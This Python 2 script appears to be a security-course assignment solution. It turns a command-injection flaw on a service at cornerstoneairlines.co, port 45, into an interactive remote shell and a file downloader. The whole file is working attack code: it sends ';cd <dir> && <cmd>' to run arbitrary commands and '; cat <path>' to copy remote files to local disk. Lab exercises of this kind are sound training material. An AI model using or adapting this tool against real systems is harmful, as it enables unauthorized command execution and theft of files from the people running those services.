"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
import time
import socket
import re

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here
curr_dir = "/"

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """

    global curr_dir
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    if cmd == "quit":
        return
    elif re.match(r'^cd (.+)' ,cmd):
        match = re.match(r'^cd (.+)' , cmd);
        curr_dir = match.group(1)
    else:
        s.connect((host, port))
        time.sleep(2)
        data = s.recv(1024)
        s.send(";cd " + curr_dir + " && " + cmd + "\n")
        time.sleep(2)
        data = s.recv(1024)
        print(data)

if __name__ == '__main__':
    command = ""

    while True:
        command = raw_input(">")
        if command == "shell":
            while command != "quit":
                command = raw_input(curr_dir + ">")
                execute_cmd(command)
                
        elif command == "quit":
            break;
        elif command == "help":
            print("shell Drop into an interactive shell and allow users to gracefully exit")
            print("pull <remote-path> <local-path> Download files")
            print("help Shows this help menu")
            print("quit Quit the shell")
        elif re.match(r'^pull (\S+) (\S+)$', command):
            match = re.match(r'^pull (\S+) (\S+)$', command)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            s.connect((host, port))
            data = s.recv(1024)
            time.sleep(2)
            s.send("; cat " + match.group(1) + "\n")
            time.sleep(2)
            data = s.recv(10000)
            
            f = open(match.group(2), "w")
            f.write(data)

            f.close()
